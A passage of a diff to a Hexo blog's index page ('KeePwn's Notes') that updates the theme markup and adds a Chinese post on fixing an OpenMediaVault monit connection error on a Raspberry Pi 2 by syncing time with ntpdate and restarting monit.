@@ -1,56 +1,81 @@
 <!doctype html>
-<html class="theme-next use-motion theme-next-mist">
+<html class="theme-next   use-motion ">
 <head>
-  
-
-<meta charset="UTF-8"/>
+  <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
 
 
-
-
-
-  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
-
-
-
-
-<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
-
-
-    <meta name="description" content="呵呵" />
-
-
-
-  <meta name="keywords" content="Hexo" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
 
 
-  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.2" />
+
+
+
+
+
+
+<meta name="description" content="呵呵">
+<meta property="og:type" content="website">
+<meta property="og:title" content="KeePwn's Notes">
+<meta property="og:url" content="http://www.keepwn.com/index.html">
+<meta property="og:site_name" content="KeePwn's Notes">
+<meta property="og:description" content="呵呵">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="KeePwn's Notes">
+<meta name="twitter:description" content="呵呵">
 
 
 
 <script type="text/javascript" id="hexo.configuration">
   var CONFIG = {
     scheme: 'Mist',
-    analytics: {
-      google: 'UA-52738842-1'
-    },
-    sidebar: 'post'
+    sidebar: 'post',
+    motion: true
   };
 </script>
-
-
-
 
   <title> KeePwn's Notes </title>
 </head>
 
-<body>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
   <!--[if lte IE 8]>
   <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
     <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
@@ -60,24 +85,40 @@
     </a>
   </div>
 <![endif]-->
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-52738842-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
 
   <div class="container one-column 
    page-home 
 ">
     <div class="headband"></div>
 
-    <div id="header" class="header">
-      <div class="header-inner">
-        <h1 class="site-meta">
-  <span class="logo-line-before"><i></i></span>
-  <a href="/" class="brand">
-      <span class="logo">
-        <i class="icon-logo"></i>
-      </span>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
       <span class="site-title">KeePwn's Notes</span>
-  </a>
-  <span class="logo-line-after"><i></i></span>
-</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">You are being watched...</p>
+</div>
 
 <div class="site-nav-toggle">
   <button>
@@ -87,7 +128,7 @@
   </button>
 </div>
 
-<div class="site-nav">
+<nav class="site-nav">
   
 
   
@@ -95,109 +136,323 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/">
-            <i class="menu-item-icon icon-home"></i> <br />
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
             首页
           </a>
         </li>
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives">
-            <i class="menu-item-icon icon-archives"></i> <br />
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
             归档
           </a>
         </li>
       
         
         <li class="menu-item menu-item-categories">
-          <a href="/categories">
-            <i class="menu-item-icon icon-categories"></i> <br />
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
+            
             分类
           </a>
         </li>
       
         
         <li class="menu-item menu-item-tags">
-          <a href="/tags">
-            <i class="menu-item-icon icon-tags"></i> <br />
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
             标签
           </a>
         </li>
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about">
-            <i class="menu-item-icon icon-about"></i> <br />
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
+            
             关于
           </a>
         </li>
+      
+
+      
       
     </ul>
   
 
   
-</div>
+</nav>
 
+ </div>
+    </header>
 
-      </div>
-    </div>
-
-    <div id="main" class="main">
+    <main id="main" class="main">
       <div class="main-inner">
         <div id="content" class="content">
           
-  <div id="posts" class="posts-expand">
+  <section id="posts" class="posts-expand">
+
+    
+
+    
+    
+      
+      
+        
+        
+        
+      
+
+      
+    
+
     
       
 
-  <div class="post post-type-normal ">
-    <div class="post-header">
+  
+  
 
-      
-      
-        <h1 class="post-title">
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/technology/error-connecting-to-the-monit-daemon-in-omv-for-pi2/" itemprop="url">
+                  Pi2版OMV的Monit连接错误的问题
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2015-12-17T00:00:00+08:00" content="2015-12-17">
+              2015-12-17
+            </time>
+          </span>
+
           
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/technology/" itemprop="url" rel="index">
+                    <span itemprop="name">technology</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
           
             
-              <a class="post-title-link" href="/technology/using-open-iscsi-in-docker-container/">
-                Docker环境下使用open-iscsi遇到的问题
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/technology/error-connecting-to-the-monit-daemon-in-omv-for-pi2/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/error-connecting-to-the-monit-daemon-in-omv-for-pi2/" itemprop="commentsCount"></span>
               </a>
+            </span>
             
           
-        </h1>
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
       
 
-      <div class="post-meta">
-        <span class="post-time">
-          发表于 2015-11-12
-        </span>
-
+      
         
-          <span class="post-category">
-            &nbsp; | &nbsp; 分类于
+          <span itemprop="articleBody">
             
-              <a href="/categories/technology/">technology</a>
-
-              
-              
+              <h2 id="背景">背景</h2><p>之前买了个树莓派2，闲置了很久，最近正好有NAS需求，就打算拿它装个<code>OpenMediaVault</code>玩玩。<br>安装过程不表。</p>
+<p>事实上是在使用过程中，遇到的某个问题比较奇葩，就拿来分享了。</p>
+<h2 id="林尽水源">林尽水源</h2><p>在网页端对OMV进行配置时，经常会遇到一个弹窗<code>monit: Cannot connect to the monit daemon. Did you start it with http support?</code>。<br>详细错误代码如下：<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">exception <span class="string">'OMVException'</span> <span class="keyword">with</span> <span class="keyword">message</span> <span class="string">'Failed to execute command '</span>export LANG=C; monit restart collectd <span class="number">2</span>&gt;&amp;<span class="number">1</span><span class="string">': monit: Cannot connect to the monit daemon. Did you start it with http support?'</span> <span class="keyword">in</span> /usr/share/php/openmediavault/monit.inc:<span class="number">113</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="string">#0</span> /usr/share/php/openmediavault/monit.inc(<span class="number">70</span>): OMVMonit-&gt;action(<span class="string">'restart'</span>, <span class="string">'collectd'</span>, false)</span><br><span class="line"><span class="string">#1</span> /usr/share/openmediavault/engined/module/collectd.inc(<span class="number">53</span>): OMVMonit-&gt;restart(<span class="string">'collectd'</span>)</span><br><span class="line"><span class="string">#2</span> /usr/share/openmediavault/engined/rpc/config.inc(<span class="number">206</span>): OMVModuleCollectd-&gt;startService()</span><br><span class="line"><span class="string">#3</span> [internal <span class="function"><span class="keyword">function</span>]:</span> OMVRpcServiceConfig-&gt;applyChanges(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#4</span> /usr/share/php/openmediavault/rpcservice.inc(<span class="number">125</span>): call_user_func_array(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#5</span> /usr/share/php/openmediavault/rpcservice.inc(<span class="number">158</span>): OMVRpcServiceAbstract-&gt;callMethod(<span class="string">'applyChanges'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#6</span> /usr/share/openmediavault/engined/rpc/config.inc(<span class="number">224</span>): OMVRpcServiceAbstract-&gt;callMethodBg(<span class="string">'applyChanges'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#7</span> [internal <span class="function"><span class="keyword">function</span>]:</span> OMVRpcServiceConfig-&gt;applyChangesBg(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#8</span> /usr/share/php/openmediavault/rpcservice.inc(<span class="number">125</span>): call_user_func_array(<span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#9</span> /usr/share/php/openmediavault/rpc.inc(<span class="number">79</span>): OMVRpcServiceAbstract-&gt;callMethod(<span class="string">'applyChangesBg'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>)</span><br><span class="line"><span class="string">#10</span> /usr/sbin/omv-engined(<span class="number">500</span>): OMVRpc::exec(<span class="string">'Config'</span>, <span class="string">'applyChangesBg'</span>, <span class="keyword">Array</span>, <span class="keyword">Array</span>, <span class="number">1</span>)</span><br><span class="line"><span class="string">#11</span> <span class="comment">&#123;main&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>ssh到<code>OMV</code>终端，输入命令：<code>monit status</code>，似乎错误信息也一样：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">monit: <span class="keyword">error</span> connecting <span class="keyword">to</span> <span class="keyword">the</span> monit daemon</span><br></pre></td></tr></table></figure></p>
+<p>在这种情况下，<code>OMV</code>就无法应用配置，必须解决这问题。</p>
+<h2 id="初仿佛若有光">初仿佛若有光</h2><p>于是去google上找啊，找啊，终于找到一篇帖子，遇到了<a href="http://forums.openmediavault.org/index.php/Thread/8973-Failed-to-execute-command-export-LANG-C-monit-restart-collectd-2-1-monit/" title="Failed to execute command &#39;export LANG=C; monit restart collectd 2&gt;&amp;1&#39;: monit" target="_blank" rel="external">相似的问题</a>（竟然不是StackOverflow，差评！)</p>
+<blockquote><p>Because ntpdate is installed in the image. Both ntp server and ntpdate cannot be installed at the same time. Also, the config for the ntp server does not work….</p>
+<p>apt-get —purge remove ntpdate</p>
+<p>Then in the OMV web gui set your timezone because after these changes you cannot set it again.</p>
+<p>then edit /etc/ntp.conf:</p>
+<p>remove these lines:<br>server 127.127.1.0 # Local clock<br>fudge 127.127.1.0 stratum 12<br>server pool.ntp.org iburst</p>
+<p>And replace with these:<br>server 0.no.pool.ntp.org iburst<br>server 1.no.pool.ntp.org iburst<br>server 2.no.pool.ntp.org iburst<br>server 3.no.pool.ntp.org iburst</p>
+<p>Then you can:<br>service ntp restart</p>
+<p>Do not disable/enable in the OMV web gui again. The mkconf file for the ntp service will overwrite thesechanges. There need to be some updates so it works properly with the rpi 2.</p>
+<p>Your logs files and dates at boot will be all messed up with wrong dates until you install a RTC module. After boot it takes some minutes before the ntp server will update the time/date. With a RTC module everything is perfect at boot.</p>
+<footer><strong>tekkb</strong></footer></blockquote>
+<p>总结几点就是：</p>
+<ul>
+<li><code>Monit</code>的错误和系统时间有关<ul>
+<li>（检查了一下，确实系统当前时间错误）</li>
+</ul>
+</li>
+<li><code>ntpdate</code>与<code>ntp server</code>有冲突，不能同时安装<ul>
+<li>（检查了一下，ntp服务启动失败）</li>
+</ul>
+</li>
+<li><code>OMV</code>自带的ntp配置<code>/etc/ntp.conf</code>有错误</li>
+<li>你应该安装<code>RTC</code>模块</li>
+</ul>
+<h2 id="复行数十步">复行数十步</h2><p>按照前面这位贤者的建议，我分别进行了一下几个测试：</p>
+<ul>
+<li>测试一: 手动修改当前时间，卸载<code>ntpdate</code>，关闭<code>ntp</code>服务<ul>
+<li>重启以后，时间丢失</li>
+</ul>
+</li>
+<li>测试二: 卸载<code>ntpdate</code>，不修改<code>ntp</code>配置文件<ul>
+<li><code>ntp</code>服务正常启动，时间同步正确</li>
+<li>重启以后，<code>ntp</code>服务正常启动，时间无法同步</li>
+</ul>
+</li>
+<li>测试三: 卸载<code>ntpdate</code>，修改<code>ntp</code>配置文件<ul>
+<li><code>ntp</code>服务正常启动，时间同步正确</li>
+<li>重启以后，<code>ntp</code>服务正常启动，时间无法同步</li>
+</ul>
+</li>
+<li>测试四: 运行<code>ntpdate</code>，强制同步<ul>
+<li>时间同步正确</li>
+<li>重启以后，<code>ntp</code>服务不能正常启动，时间无法同步</li>
+</ul>
+</li>
+</ul>
+<p>测试后发现，因为树莓派本身的硬件限制，系统重启后会丢失当前时间。<br>尽管开启了<code>ntp</code>服务，但是如果系统当前时间与真实时间跨度太大，则不会进行同步。</p>
+<p>所以只能放弃<code>ntp server</code>，转而使用<code>ntpdate</code>来强制同步时间，并设置开机启动。<br>代码如下：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置开机同步时间，注意: 添加的代码必须在`exit 0`之前</span></span><br><span class="line">echo <span class="string">'/usr/sbin/ntpdate 0.cn.pool.ntp.org'</span> <span class="prompt">&gt;&gt; </span>/etc/rc.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置同步任务，每隔5分钟同步一次时间</span></span><br><span class="line"><span class="comment"># 编辑crontab，并保存</span></span><br><span class="line">crontab -e</span><br><span class="line">*<span class="regexp">/5 * * * * /usr</span><span class="regexp">/sbin/ntpdate</span> <span class="number">0</span>.cn.pool.ntp.org</span><br></pre></td></tr></table></figure></p>
+<p>重启系统，系统时间已经正确了。<br>在网页端对<code>OMV</code>重新进行配置。WTF，怎么还是<code>monit</code>这个问题！</p>
+<h2 id="豁然开朗">豁然开朗</h2><p>登入终端，重新进行检查：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@raspberrypi</span><span class="symbol">:~</span><span class="comment"># date</span></span><br><span class="line"><span class="constant">Dec </span><span class="number">16</span> <span class="number">11</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:</span><span class="number">04</span> <span class="constant">CST </span><span class="number">2015</span></span><br><span class="line">root<span class="variable">@raspberrypi</span><span class="symbol">:~</span><span class="comment"># monit status</span></span><br><span class="line"><span class="symbol">monit:</span> error connecting to the monit daemon</span><br></pre></td></tr></table></figure></p>
+<p>到这里时，我当时确实很疑惑，明明系统时间已经正确了，为什么<code>monit</code>还是报错呢。<br>突然灵光乍现，重新启动<code>monit</code>服务，然后十几秒过后：<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@raspberrypi</span>:~# monit status</span><br><span class="line">The Monit daemon <span class="number">5.4</span> uptime: <span class="number">18</span>m </span><br><span class="line"></span><br><span class="line">System <span class="string">'localhost'</span></span><br><span class="line">  status                            Running</span><br><span class="line">  monitoring status                 Monitored</span><br><span class="line">  load average                      [<span class="number">0.00</span>] [<span class="number">0.01</span>] [<span class="number">0.05</span>]</span><br><span class="line">  cpu                               <span class="number">0.0</span><span class="variable">%us</span> <span class="number">0.1</span><span class="variable">%sy</span> <span class="number">0.0</span><span class="variable">%wa</span></span><br><span class="line">  <span class="keyword">memory</span> usage                      <span class="number">55424</span> kB [<span class="number">5.5</span><span class="variable">%]</span></span><br><span class="line">  swap usage                        <span class="number">0</span> kB [<span class="number">0.0</span><span class="variable">%]</span></span><br><span class="line">  data collected                    <span class="number">16</span> Dec <span class="number">2015</span> <span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Process <span class="string">'collectd'</span></span><br><span class="line">  status                            Running</span><br><span class="line">  monitoring status                 Monitored</span><br><span class="line">  pid                               <span class="number">2535</span></span><br><span class="line">  <span class="keyword">parent</span> pid                        <span class="number">1</span></span><br><span class="line">  uptime                            <span class="number">18</span>m </span><br><span class="line">  children                          <span class="number">0</span></span><br><span class="line">  <span class="keyword">memory</span> kilobytes                  <span class="number">4224</span></span><br><span class="line">  <span class="keyword">memory</span> kilobytes total            <span class="number">4224</span></span><br><span class="line">  <span class="keyword">memory</span> <span class="keyword">percent</span>                    <span class="number">0.4</span>%</span><br><span class="line">  <span class="keyword">memory</span> <span class="keyword">percent</span> total              <span class="number">0.4</span>%</span><br><span class="line">  cpu <span class="keyword">percent</span>                       <span class="number">0.0</span>%</span><br><span class="line">  cpu <span class="keyword">percent</span> total                 <span class="number">0.0</span>%</span><br><span class="line">  data collected                    <span class="number">16</span> Dec <span class="number">2015</span> <span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span></span><br></pre></td></tr></table></figure></p>
+<p>在此个人分析，在<code>monit</code>服务启动时，系统时间还未同步，所以<code>monit</code>初始化失败。只要保证在时间同步后，再重启<code>monit</code>服务应该就可以了。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在强制同步时间后，再重启monit服务</span></span><br><span class="line">echo <span class="string">'/etc/init.d/monit restart'</span> <span class="prompt">&gt;&gt; </span>/etc/rc.local</span><br></pre></td></tr></table></figure></p>
+<p>重启系统，一切正常。END！</p>
+<h2 id="参考">参考</h2><ul>
+<li><a href="http://forums.openmediavault.org/index.php/Thread/8973-Failed-to-execute-command-export-LANG-C-monit-restart-collectd-2-1-monit/" target="_blank" rel="external">http://forums.openmediavault.org/index.php/Thread/8973-Failed-to-execute-command-export-LANG-C-monit-restart-collectd-2-1-monit/</a></li>
+<li><a href="http://forums.openmediavault.org/index.php/Thread/8770-RPi-2-RTC-module-from-unruly-Stepchild-to-Wunderkind/" target="_blank" rel="external">http://forums.openmediavault.org/index.php/Thread/8770-RPi-2-RTC-module-from-unruly-Stepchild-to-Wunderkind/</a></li>
+<li><a href="https://www.raspberrypi.org/forums/viewtopic.php?f=91&amp;t=83344" target="_blank" rel="external">https://www.raspberrypi.org/forums/viewtopic.php?f=91&amp;t=83344</a></li>
+</ul>
 
             
           </span>
         
-
-        
-          
-            <span class="post-comments-count">
-            &nbsp; | &nbsp;
-            <a href="/technology/using-open-iscsi-in-docker-container/#comments" >
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/using-open-iscsi-in-docker-container/"></span>
-            </a>
-          </span>
-          
-        
-      </div>
+      
     </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/technology/using-open-iscsi-in-docker-container/" itemprop="url">
+                  Docker环境下使用open-iscsi遇到的问题
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2015-11-12T00:00:00+08:00" content="2015-11-12">
+              2015-11-12
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/technology/" itemprop="url" rel="index">
+                    <span itemprop="name">technology</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/technology/using-open-iscsi-in-docker-container/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/using-open-iscsi-in-docker-container/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
 
     <div class="post-body">
 
@@ -216,7 +471,7 @@
 </li>
 </ul>
           <div class="post-more-link text-center">
-            <a class="btn" href="/technology/using-open-iscsi-in-docker-container/#more">
+            <a class="btn" href="/technology/using-open-iscsi-in-docker-container/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -224,7 +479,7 @@
       
     </div>
 
-    <div class="post-footer">
+    <footer class="post-footer">
       
 
       
@@ -233,60 +488,82 @@
       
         <div class="post-eof"></div>
       
-    </div>
-  </div>
+    </footer>
+  </article>
 
 
     
       
 
-  <div class="post post-type-normal ">
-    <div class="post-header">
+  
+  
 
-      
-      
-        <h1 class="post-title">
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/howto/howto-connect-iscsi-on-ubuntu/" itemprop="url">
+                  Ubuntu14.04下连接ISCSI存储
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2015-11-10T00:00:00+08:00" content="2015-11-10">
+              2015-11-10
+            </time>
+          </span>
+
           
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/howto/" itemprop="url" rel="index">
+                    <span itemprop="name">howto</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
           
             
-              <a class="post-title-link" href="/howto/howto-connect-iscsi-on-ubuntu/">
-                Ubuntu14.04下连接ISCSI存储
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/howto/howto-connect-iscsi-on-ubuntu/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="howto/howto-connect-iscsi-on-ubuntu/" itemprop="commentsCount"></span>
               </a>
+            </span>
             
           
-        </h1>
-      
 
-      <div class="post-meta">
-        <span class="post-time">
-          发表于 2015-11-10
-        </span>
-
-        
-          <span class="post-category">
-            &nbsp; | &nbsp; 分类于
-            
-              <a href="/categories/howto/">howto</a>
-
-              
-              
-
-            
-          </span>
-        
-
-        
           
-            <span class="post-comments-count">
-            &nbsp; | &nbsp;
-            <a href="/howto/howto-connect-iscsi-on-ubuntu/#comments" >
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="howto/howto-connect-iscsi-on-ubuntu/"></span>
-            </a>
-          </span>
-          
-        
-      </div>
-    </div>
+
+        </div>
+      </header>
+    
+
 
     <div class="post-body">
 
@@ -305,7 +582,7 @@
 </ul>
 <h2 id="配置过程">配置过程</h2><h3 id="安装程序open-iscsi">安装程序<code>open-iscsi</code></h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>apt-get install open-iscsi</span><br><span class="line">test<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>service open-iscsi status</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
-            <a class="btn" href="/howto/howto-connect-iscsi-on-ubuntu/#more">
+            <a class="btn" href="/howto/howto-connect-iscsi-on-ubuntu/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -313,7 +590,7 @@
       
     </div>
 
-    <div class="post-footer">
+    <footer class="post-footer">
       
 
       
@@ -322,60 +599,82 @@
       
         <div class="post-eof"></div>
       
-    </div>
-  </div>
+    </footer>
+  </article>
 
 
     
       
 
-  <div class="post post-type-normal ">
-    <div class="post-header">
+  
+  
 
-      
-      
-        <h1 class="post-title">
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/technology/run-app-based-on-mef-from-web/" itemprop="url">
+                  Altman不能成功的加载插件
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-07-28T00:00:00+08:00" content="2014-07-28">
+              2014-07-28
+            </time>
+          </span>
+
           
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/technology/" itemprop="url" rel="index">
+                    <span itemprop="name">technology</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
           
             
-              <a class="post-title-link" href="/technology/run-app-based-on-mef-from-web/">
-                Altman不能成功的加载插件
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/technology/run-app-based-on-mef-from-web/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/run-app-based-on-mef-from-web/" itemprop="commentsCount"></span>
               </a>
+            </span>
             
           
-        </h1>
-      
 
-      <div class="post-meta">
-        <span class="post-time">
-          发表于 2014-07-28
-        </span>
-
-        
-          <span class="post-category">
-            &nbsp; | &nbsp; 分类于
-            
-              <a href="/categories/technology/">technology</a>
-
-              
-              
-
-            
-          </span>
-        
-
-        
           
-            <span class="post-comments-count">
-            &nbsp; | &nbsp;
-            <a href="/technology/run-app-based-on-mef-from-web/#comments" >
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/run-app-based-on-mef-from-web/"></span>
-            </a>
-          </span>
-          
-        
-      </div>
-    </div>
+
+        </div>
+      </header>
+    
+
 
     <div class="post-body">
 
@@ -390,7 +689,7 @@
 <p>原来，当我们从Web下载Altman程序的时候，程序集将会被添加一个新的安全属性（文件来自网络，已被锁定）。运行altman，由于loadFromRemoteSources默认属性是false，程序就无法加载这些插件dll。(在<a href="http://msdn.microsoft.com/en-us/library/dd409252(VS.100).aspx">这里</a>有详细的说明)</p>
 <p>所以，解决这个问题目前有三种方法：</p>
           <div class="post-more-link text-center">
-            <a class="btn" href="/technology/run-app-based-on-mef-from-web/#more">
+            <a class="btn" href="/technology/run-app-based-on-mef-from-web/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -398,7 +697,7 @@
       
     </div>
 
-    <div class="post-footer">
+    <footer class="post-footer">
       
 
       
@@ -407,60 +706,82 @@
       
         <div class="post-eof"></div>
       
-    </div>
-  </div>
+    </footer>
+  </article>
 
 
     
       
 
-  <div class="post post-type-normal ">
-    <div class="post-header">
+  
+  
 
-      
-      
-        <h1 class="post-title">
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/howto/osx-installed-mono-environment/" itemprop="url">
+                  Mac安装mono环境
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-07-25T00:00:00+08:00" content="2014-07-25">
+              2014-07-25
+            </time>
+          </span>
+
           
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
